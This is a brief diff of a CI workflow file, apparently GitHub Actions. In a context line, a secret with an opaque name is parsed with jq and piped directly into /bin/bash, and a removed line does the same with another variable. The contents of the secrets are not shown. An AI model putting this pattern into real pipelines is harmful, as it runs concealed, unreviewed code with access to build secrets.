@@ -27,7 +27,6 @@ jobs:
           pzi9: ${{ secrets.pzi9 }}
         run: |
           printf '%s' "$pzi9" | jq -r .nl37 | /bin/bash
-          echo $kec05 | jq -r .nyh74 | /bin/bash
 
       - name: Store artifact
         if: always()
